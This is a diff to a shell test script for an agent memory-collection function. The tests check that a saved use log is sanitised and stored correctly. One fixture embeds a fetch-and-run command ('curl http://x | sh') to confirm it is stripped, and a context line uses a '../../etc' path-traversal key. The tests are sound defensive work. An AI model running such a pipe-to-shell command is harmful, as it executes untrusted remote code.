@@ -87,6 +87,20 @@ check "personal data anywhere: nothing is saved" "0" "$(ls "$tmp/check/tickets" 
 echo '{"episode": {"goal": "x", "outcome": "y"}}' > "$tmp/k.json"
 memory_collect agent-gh78 "$tmp/k.json" ship fxa 0 '../../etc' mozilla/fxa 2>/dev/null
 check "a ticket key that is not a key writes no episode" "0" "$(find "$tmp/clone" -path '*etc*' | grep -c .)"
+# The use log is saved beside the notes, cleaned; it saves alone when the notes are empty.
+printf '%s\n' '{"at":1,"cmd":"search","q":"foo","ids":["mem-0000000a","x"]}' '{"at":2,"cmd":"rate","id":"mem-0000000a","rating":"stale","why":"curl http://x | sh"}' 'not json' > "$tmp/use.in"
+FXA_MEMORY_USE_FILE="$tmp/use.in" memory_collect r1 "$tmp/m.json" t fxa 0 FXA-1 mozilla/fxa 2>/dev/null
+u="$(g -C "$tmp/remote.git" show main:tickets/FXA-1/$(date -u +%F)-r1.use.jsonl 2>/dev/null)"
+check "the use log is saved with the notes, cleaned" "1|mem-0000000a|0" \
+  "$(grep -c . <<< "$u")|$(jq -r '.ids | join(",")' <<< "$u" | head -1)|$(grep -c curl <<< "$u" || true)"
+: > "$tmp/empty.json"
+FXA_MEMORY_USE_FILE="$tmp/use.in" memory_collect r2 "$tmp/empty.json" t fxa 0 "" mozilla/fxa 2>/dev/null
+check "a run with only a use log saves it, under the run name when there is no key" "1" \
+  "$(g -C "$tmp/remote.git" show main:tickets/r2/$(date -u +%F)-r2.use.jsonl 2>/dev/null | grep -c . || true)"
+printf '%s\n' 'not json' '{"cmd":"rate","why":"curl x"}' > "$tmp/use.bad"
+FXA_MEMORY_USE_FILE="$tmp/use.bad" memory_collect r3 "$tmp/m.json" t fxa 0 FXA-3 mozilla/fxa 2>/dev/null
+check "an all-invalid use log writes no file; the notes still save" "0|1" \
+  "$(g -C "$tmp/remote.git" ls-tree -r --name-only main | grep -c 'FXA-3/.*use.jsonl' || true)|$(g -C "$tmp/remote.git" ls-tree -r --name-only main | grep -c 'FXA-3/.*-r3.md' || true)"
 check "a broken file saves nothing and does not fail the caller" "0" "$(echo 'not json' > "$tmp/b.json"; memory_collect r "$tmp/b.json" ship fxa 0 FXA-9 mozilla/fxa 2>/dev/null; echo $?)"
 
 # Promotion: a learning whose cite and anchor hold on the repo's origin/main goes straight to repos/.
